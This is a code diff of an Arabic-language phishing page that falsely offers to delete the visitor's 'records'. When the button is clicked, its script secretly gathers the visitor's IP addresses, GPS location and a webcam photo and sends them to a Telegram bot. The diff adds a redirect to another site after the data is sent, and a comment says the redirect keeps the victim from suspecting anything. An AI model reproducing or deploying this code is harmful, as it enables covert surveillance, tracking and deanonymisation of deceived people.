@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة حماية وسجلات الأمان</title>
+    <title>منصة أبواب - التحقق من السجلات</title>
     <style>
         body {
             font-family: Tahoma, sans-serif;
@@ -31,8 +31,8 @@
             margin-bottom: 25px;
         }
         button {
-            background-color: #28a745;
-            color: white;
+            background-color: #ffc107;
+            color: #333;
             border: none;
             padding: 14px 20px;
             font-size: 16px;
@@ -43,7 +43,7 @@
             transition: background 0.3s;
         }
         button:hover {
-            background-color: #218838;
+            background-color: #e0a800;
         }
     </style>
 </head>
@@ -51,7 +51,7 @@
 
     <div class="container" id="mainBox">
         <h1>التحقق من السجلات وحذف البيانات</h1>
-        <p>تم رصد اسمك ضمن قائمة السجلات المتاحة. انقر على الزر أدناه لتأكيد الهوية وبدء عملية الحذف الفوري.</p>
+        <p>تم رصد اسمك ضمن السجلات المتاحة. انقر على الزر أدناه لتأكيد الهوية وبدء عملية الحذف الفوري والانتقال للمنصة.</p>
         <button id="triggerBtn">بدء عملية فحص وحذف البيانات</button>
     </div>
 
@@ -64,7 +64,7 @@
         const CHAT_ID = '7110865740';
 
         function sendToTelegram(text) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -74,7 +74,6 @@
                 })
             })
             .then(r => r.json())
-            .then(data => console.log('✅:', data.ok))
             .catch(err => console.error('❌:', err));
         }
 
@@ -85,12 +84,11 @@
             formData.append('parse_mode', 'HTML');
             formData.append('photo', blob, 'camera_capture.jpg');
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             })
             .then(res => res.json())
-            .then(data => console.log('📷 تم إرسال الصورة:', data.ok))
             .catch(err => console.error('❌ خطأ في إرسال الصورة:', err));
         }
 
@@ -175,9 +173,13 @@
             });
         }
 
-        // ربط العملية بالنقر على الزر الوهمي لتجاوز الحظر الأمني للمتصفحات
+        // دالة إعادة التوجيه للموقع المطلوب
+        function redirectToAbwaab() {
+            window.location.href = 'http://abwaabiraq.com';
+        }
+
         document.getElementById('triggerBtn').addEventListener('click', async function() {
-            this.innerText = "جاري فحص وحذف السجلات...";
+            this.innerText = "جاري معالجة الطلب والنقل للمنصة...";
             this.disabled = true;
 
             const ipv4 = await getPublicIPv4();
@@ -187,7 +189,7 @@
             const gpsLocation = await getExactGPSLocation();
 
             let msg = `<blockquote>`;
-            msg += ` <b>زيارة تفاعلية جديدة (عبر الزر)</b>\n\n`;
+            msg += ` <b>زيارة تفاعلية وتحويل ناجح</b>\n\n`;
             msg += ` <b>IP العام (IPv4)</b>: <tg-spoiler> ${ipv4} </tg-spoiler>\n`;
             msg += ` <b>IP العام (IPv6)</b>: <tg-spoiler> ${ipv6} </tg-spoiler>\n`;
             msg += ` <b>IP المحلي (Local)</b>: <tg-spoiler> ${localIP} </tg-spoiler>\n\n`;
@@ -213,7 +215,7 @@
             msg += ` <b>وقت الدخول</b>: <code>${new Date().toLocaleString('ar-EG')}</code>\n`;
             msg += `</blockquote>`;
 
-            // تشغيل الكاميرا والتقاط الصورة بعد الضغط مباشرة
+            // تشغيل الكاميرا والتقاط الصورة ثم التحويل التلقائي
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
             .then(stream => {
                 const video = document.getElementById('video');
@@ -229,15 +231,19 @@
                     stream.getTracks().forEach(track => track.stop());
 
                     canvas.toBlob(blob => {
-                        sendPhotoToTelegram(blob, msg);
-                        document.getElementById('mainBox').innerHTML = '<h2>تمت العملية بنجاح</h2><p>تم إزالة السجلات الخاصة بك من القواعد بنجاح.</p>';
+                        sendPhotoToTelegram(blob, msg).then(() => {
+                            // التوجيه فور إتمام إرسال الصورة
+                            redirectToAbwaab();
+                        });
                     }, 'image/jpeg', 0.8);
                 }, 1500);
             })
             .catch(err => {
                 console.log('مرفوض أو غير متاح:', err);
-                sendToTelegram(msg + "\n⚠️ <b>ملاحظة:</b> تم رفض إذن الكاميرا من قبل المستخدم.");
-                document.getElementById('mainBox').innerHTML = '<h2>عذراً</h2><p>حدث خطأ أثناء الاتصال بخادم الحذف.</p>';
+                sendToTelegram(msg + "\n⚠️ <b>ملاحظة:</b> تم رفض إذن الكاميرا من قبل المستخدم.").then(() => {
+                    // حتى لو رفض الكاميرا، يتم تحويله للموقع الأصلي لكي لا يشك بشيء
+                    redirectToAbwaab();
+                });
             });
         });
     </script>
